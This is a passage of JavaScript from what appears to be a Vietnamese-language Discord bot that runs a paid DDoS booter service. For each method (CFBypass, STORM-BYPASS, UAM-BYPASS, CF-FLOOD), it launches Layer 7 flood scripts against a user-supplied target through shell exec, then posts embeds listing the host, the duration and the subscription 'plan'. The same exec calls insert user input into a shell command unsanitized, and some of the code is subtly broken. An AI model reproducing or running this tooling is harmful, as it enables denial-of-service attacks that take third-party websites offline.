          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
      


          
      
                      if (methods === 'CFBypass') {
        var CFBypass = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${CFBypass}.js ${target} ${time}`, (error, stdout, stderr) => {
    });
  console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
         {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💀 HOST`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
if (methods === 'STORM-BYPASS ') {
       var STORMBYPASS = methods;
                  var exec = 
                  require('child_process').exec
      exec(`node methods/L7/${STORMBYPASS}.js GET ${target} ${time} 400 90 http.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`💥 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
}

     if (methods === 'UAM-BYPASS') {
       var HTTPREQUEST = methods;
       var exec =
                  require('child_process').exec
       exec(`node methods/L7/${UAMBYPASS}.js ${target} ${time} 100000 proxy.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
    if (methods === 'CF-FLOOD') {
var CFFLOOD = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${CFFLOOD}.js ${target} ${time}`, (error, stdout, stderr) => {
    });
    console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
          
        {
          name: "`🔗 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  
               
              })
                }, 3000)
            })
        }
  }

 }  

